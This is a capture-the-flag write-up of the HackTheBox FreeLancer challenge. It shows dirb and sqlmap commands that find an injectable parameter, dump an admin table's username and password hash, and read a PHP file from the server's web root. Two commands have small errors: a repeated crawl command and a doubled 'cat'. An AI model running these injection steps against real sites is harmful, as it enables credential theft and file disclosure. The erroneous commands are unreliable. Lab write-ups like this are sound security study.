---
description: Notes from the HackTheBox FreeLancer challenge, including discovery findings and the steps taken through
  the exercise.
image:
  path: /assets/img/sample/dirb_freelancer.png
  alt: Screenshot from FreeLancer
title: FreeLancer
date: 2020-09-22 10:00:00 +0300
categories:
- HackTheBox
- Challenges
tags:
- htb
lang: en
translation_key: 2020-09-24-FreeLancer
permalink: /posts/freelancer/
---

### Dictionary attack

Run `dirb` to gather as much information as possible about the target. Its output reveals this URL:

`http://docker.hackthebox.eu:31317/administrat/`

![Desktop view](/assets/img/sample/dirb_freelancer.png)

### SQL injection

Next, run `sqlmap`.

1. Start with a crawl.

```shell
sqlmap -u  http://docker.hackthebox.eu:31625/ --crawl=2
```

This reveals the URL `http://docker.hackthebox.eu:31625/portfolio.php?id=1`.

![Desktop view](/assets/img/sample/sqlmap_crawl.png)

2. Run sqlmap again to find the databases.

```shell
sqlmap -u  http://docker.hackthebox.eu:31625/ --crawl=2
```

![Desktop view](/assets/img/sample/sql_map_db_tables.png)

Having found the `safeadmin` table in the `freelancer` database, check it for possible users.

```shell
sqlmap -u http://docker.hackthebox.eu:31625/portfolio.php?id=1/ -T safeadmin --dump
```

As the following screenshot shows, we obtained a username and a hashed password.

![Desktop view](/assets/img/sample/table_enumarate.png)

> So far, we have used `sqlmap` to find a username and password to try at the URL discovered with `dirb`.

## Things get a little harder

After several attempts, the solution was to run `dirb` again against the `administrat` directory. This revealed `panel.php`.

```shell
dirb "http://docker.hackthebox.eu:31762/administrat/" -X.php
```

![Desktop view](/assets/img/sample/dirb_directory_freelancer.png)

Knowing that the default web directory is `/var/www/html`, we use sqlmap again to download `panel.php`.

```shell
sqlmap -u http://docker.hackthebox.eu:31762/portfolio.php?id=1 --file-read=/var/www/html/administrat/panel.php
```

![Desktop view](/assets/img/sample/download_freelancer_php.png)

```shell
cat cat '/home/kali/.local/share/sqlmap/output/docker.hackthebox.eu'
```

![Desktop view](/assets/img/sample/cat_freelancer_flag.png)

Looking inside the file gives us the flag.
